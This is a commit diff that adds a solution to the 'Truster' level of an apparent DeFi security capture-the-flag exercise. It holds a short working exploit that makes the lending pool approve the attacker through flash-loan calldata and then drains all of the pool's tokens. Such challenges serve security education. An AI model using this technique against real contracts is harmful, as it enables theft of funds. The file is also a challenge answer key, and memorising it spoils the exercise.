2019bbf59ff0b58b92e95531d78ea2558c827c7a
Your Name <you@example.com>
2023-03-02 16:14:05 +0000

    solution for Truster

--- test/Levels/truster/Truster.t.sol
+++ test/Levels/truster/Truster.t.sol
@@ -41,7 +41,12 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", attacker, TOKENS_IN_POOL);
+        trusterLenderPool.flashLoan(0, attacker, address(dvt), data);
+        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
 
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
